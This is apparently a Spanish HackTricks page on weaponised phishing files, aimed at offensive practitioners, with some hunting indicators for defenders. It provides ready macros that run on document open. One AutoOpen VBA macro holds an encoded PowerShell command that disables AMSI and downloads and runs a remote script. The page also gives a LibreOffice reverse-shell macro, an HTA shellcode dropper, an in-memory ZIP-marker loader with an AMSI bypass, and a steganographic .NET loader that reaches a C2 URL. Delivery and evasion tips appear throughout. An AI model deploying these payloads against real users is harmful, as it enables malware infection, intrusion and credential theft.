# Archivos y documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza una validación de los datos del archivo antes de abrirlo. La validación de los datos se realiza mediante la identificación de la estructura de datos, conforme al estándar OfficeOpenXML. Si se produce algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.

Normalmente, los archivos de Word que contienen macros utilizan la extensión `.docm`. Sin embargo, es posible cambiar el nombre del archivo modificando la extensión y conservar sus capacidades de ejecución de macros.\
Por ejemplo, un archivo RTF no admite macros por diseño, pero un archivo DOCM renombrado a RTF será procesado por Microsoft Word y podrá ejecutar macros.\
Los mismos componentes internos y mecanismos se aplican a todo el software de Microsoft Office Suite (Excel, PowerPoint, etc.).

Puedes utilizar el siguiente comando para comprobar qué extensiones van a ser ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
Los archivos DOCX que hacen referencia a una plantilla remota (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden “ejecutar” macros.

### Carga de imágenes externas

Ve a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Ve a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de carga automática

Cuanto más comunes sean, más probable será que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **File > Info > Inspect Document > Inspect Document**, lo que abrirá el Document Inspector. Haz clic en **Inspect** y, a continuación, en **Remove All**, junto a **Document Properties and Personal Information**.

#### Extensión Doc

Cuando termines, selecciona el menú desplegable **Save as type** y cambia el formato de **`.docx`** a Word 97-2003 **`.doc`**.\
Hazlo porque **no puedes guardar macros dentro de un `.docx`** y existe un **estigma** **en torno a** la extensión **`.docm`** habilitada para macros (por ejemplo, el icono de la miniatura tiene un enorme `!` y algunas puertas de enlace web/correo electrónico las bloquean por completo). Por lo tanto, esta **extensión `.doc` heredada es el mejor compromiso**.

#### Generadores de macros maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros autoejecutables de LibreOffice ODT (Basic)

Los documentos de LibreOffice Writer pueden incluir macros Basic y ejecutarlas automáticamente cuando se abre el archivo, vinculando la macro al evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una macro de reverse shell sencilla tiene este aspecto:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Ten en cuenta las comillas duplicadas (`""`) dentro de la cadena: LibreOffice Basic las utiliza para escapar las comillas literales, por lo que los payloads que terminan en `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Consejos de entrega:

- Guarda el archivo como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar el correo con `swaks`, utiliza `--attach @resume.odt` (el carácter `@` es obligatorio para que se envíen los bytes del archivo, no la cadena con el nombre del archivo, como adjunto). Esto es fundamental al abusar de SMTP servers que aceptan destinatarios arbitrarios en `RCPT TO` sin validación.

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación con "confianza total", sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta mediante **`mshta.exe`**, que normalmente se **instala** junto con **Internet Explorer**, por lo que **`mshta` depende de IE**. Por tanto, si se ha desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzando la autenticación NTLM

Existen varias formas de **forzar la autenticación NTLM "remotamente"**; por ejemplo, podrías añadir **imágenes invisibles** a correos electrónicos o HTML a los que accederá el usuario (¿incluso mediante HTTP MitM?). También puedes enviar a la víctima la **dirección de archivos** que **desencadenarán** una **autenticación** simplemente al **abrir la carpeta**.

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques de NTLM relay**:

- [**Ataques de NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay a certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads incrustados en ZIP (fileless chain)

Las campañas altamente efectivas distribuyen un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco consiste en que el loader de PowerShell real se almacena dentro de los bytes sin procesar del ZIP después de un marcador único, y el .lnk lo extrae y lo ejecuta completamente en memoria.<sup>[[2]](#references)</sup>

Flujo típico implementado por el one-liner de PowerShell del .lnk:

1) Localizar el ZIP original en rutas comunes: Escritorio, Descargas, Documentos, %TEMP%, %ProgramData% y el directorio padre del directorio de trabajo actual.
2) Leer los bytes del ZIP y buscar un marcador codificado (por ejemplo, xFIQCV). Todo lo que se encuentre después del marcador será el payload de PowerShell incrustado.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el .docx señuelo para aparentar legitimidad.
4) Bypass de AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (por ejemplo, eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de esqueleto de PowerShell para extraer y ejecutar la etapa incrustada:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- La entrega suele abusar de subdominios PaaS reputados (p. ej., *.herokuapp.com) y puede filtrar los payloads (servir ZIPs benignos según la IP/UA).
- La siguiente etapa suele descifrar shellcode codificado en base64/XOR y ejecutarlo mediante Reflection.Emit + VirtualAlloc para minimizar los artefactos en disco.

Persistencia utilizada en la misma cadena
- COM TypeLib hijacking del control Microsoft Web Browser, de modo que IE/Explorer o cualquier aplicación que lo integre vuelva a lanzar automáticamente el payload.<sup>[[2]](#references)[[4]](#references)</sup> Consulta aquí los detalles y comandos listos para usar:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Búsqueda/IOCs
- Archivos ZIP que contienen la cadena marcador ASCII (p. ej., xFIQCV) añadida a los datos del archivo.
- .lnk que enumera las carpetas principales y del usuario para localizar el ZIP y abre un documento señuelo.
- Manipulación de AMSI mediante [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Hilos empresariales de larga duración que terminan con enlaces alojados bajo dominios PaaS confiables.

## Staging de señuelo primero mediante LNK → persistencia con scheduled task → side-loading de CPL confiable

Otro patrón recurrente es un **`.lnk` que suplanta a un documento** y abre inmediatamente un señuelo benigno mientras prepara la cadena real en segundo plano.<sup>[[3]](#references)</sup>

Flujo observado:
1. El acceso directo **se hace pasar por un PDF** y utiliza `conhost.exe` u otro proxy similar para iniciar un downloader de PowerShell ofuscado.
2. PowerShell fragmenta tokens evidentes (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), por lo que las detecciones ingenuas que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detectan el comando.
3. El stager descarga primero el **documento señuelo**, lo abre para la víctima y luego reconstruye los archivos maliciosos en segundo plano.
4. Los payloads pueden escribirse con **extensiones basura** y luego renombrarse eliminando los caracteres de relleno, retrasando la aparición de artefactos `.exe` / `.cpl` evidentes.
5. La persistencia se establece con una **scheduled task basada en minutos** que inicia un binario host confiable desde una ruta escribible por el usuario.

Pistas mínimas para la búsqueda de este patrón:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Un diseño de staging útil que conviene reconocer es:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por qué la segunda etapa es sigilosa

En el caso práctico de Rapid7, la scheduled task ejecutaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** se había preparado junto a él y exportaba **`RunFODW`**, el binario legítimo de Microsoft cargaba mediante side-loading el CPL del atacante en lugar de la copia legítima del sistema.

A continuación, el CPL:
- Lee un blob **AES-256-CBC** desde `C:\Windows\Tasks\editor.dat`
- Lo descifra mediante **Windows CNG / `bcrypt.dll`**
- Asigna memoria ejecutable y copia el shellcode descifrado
- Lo ejecuta indirectamente pasando el puntero al shellcode como callback de **`EnumUILanguagesW`**

Este último paso merece buscarse por separado: el malware suele evitar un salto directo `((void(*)())buf)()` y, en su lugar, abusa de una **legitimate callback-taking WinAPI** para transferir la ejecución.

El payload descifrado en esta campaña era shellcode **Donut**, que después mapeaba el PE final completamente en memoria y parcheaba **AMSI/WLDP/ETW** en el proceso actual antes de cederle la ejecución. Para obtener notas más detalladas sobre side-loading y el post-processing residente en memoria, consulta:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivotes prácticos de hunting:
- `.lnk` que inicia `powershell.exe` o `conhost.exe`, seguido de un documento señuelo visible.
- Descargas de corta duración a **`C:\Users\Public\`**, seguidas de renombrados inmediatos desde extensiones sin sentido.
- Scheduled tasks con nombres anodinos como `GoogleErrorReport` que se ejecutan desde **directorios modificables por el usuario**.
- Binarios de confianza que cargan archivos **`.cpl` / `.dll`** desde el mismo directorio no perteneciente al sistema.
- Blobs de texto Base64 escritos en **`C:\Windows\Tasks\`** y posteriormente leídos por el módulo cargado mediante side-loading.

## Payloads delimitados mediante Steganography en imágenes (PowerShell stager)

Las cadenas de loader recientes entregan un JavaScript/VBS ofuscado que decodifica y ejecuta un PowerShell stager en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una DLL .NET codificada en Base64 y oculta como texto plano entre marcadores únicos de inicio y final. El script busca estos delimitadores (ejemplos observados in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, lo decodifica de Base64 a bytes, carga el assembly en memoria e invoca un método de entrada conocido con la URL de C2.<sup>[[5]](#references)</sup>

Flujo de trabajo
- Stage 1: Archived JS/VBS dropper → decodifica el Base64 incrustado → inicia un PowerShell stager con -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → descarga una imagen, extrae el Base64 delimitado por marcadores, carga la DLL .NET en memoria e invoca su método (por ejemplo, VAI), pasando la URL y las opciones de C2.
- Stage 3: Loader recupera el payload final y normalmente lo inyecta mediante process hollowing en un binario de confianza (habitualmente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Consulta más información sobre process hollowing y trusted utility proxy execution aquí:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ejemplo de PowerShell para extraer una DLL de una imagen e invocar un método .NET en memoria:

<details>
<summary>Extractor y loader de payload Stego en PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Esto corresponde a ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Los markers varían según la campaña.
- El bypass de AMSI/ETW y la deobfuscation de strings suelen aplicarse antes de cargar el assembly.
- Hunting: analizar las imágenes descargadas en busca de delimitadores conocidos; identificar PowerShell accediendo a imágenes y decodificando inmediatamente blobs Base64.

Consulta también las herramientas stego y las técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → staging de PowerShell con Base64

Una etapa inicial recurrente es un `.js` o `.vbs` pequeño y heavily-obfuscated entregado dentro de un archive. Su único propósito es decodificar un string Base64 incrustado y lanzar PowerShell con `-nop -w hidden -ep bypass` para bootstrappear la siguiente etapa mediante HTTPS.<sup>[[5]](#references)</sup>

Lógica base (abstracta):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre strings basura
- Decodificarlo a PowerShell ASCII
- Ejecutarlo con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicadores para Hunting
- Attachments JS/VBS archivados que generan `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
- `wscript.exe` lanzando `powershell.exe -nop -w hidden` desde rutas temporales del usuario.

## Archivos de Windows para robar hashes NTLM

Consulta la página sobre **lugares donde robar credenciales NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – macro de LibreOffice → webshell de IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campaña ZipLine: un ataque de phishing sofisticado dirigido contra empresas estadounidenses](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: seguimiento del tradecraft de Dropping Elephant mediante una cadena de loaders con temática china](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nueva técnica de persistencia COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – El loader PhantomVAI distribuye una variedad de infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
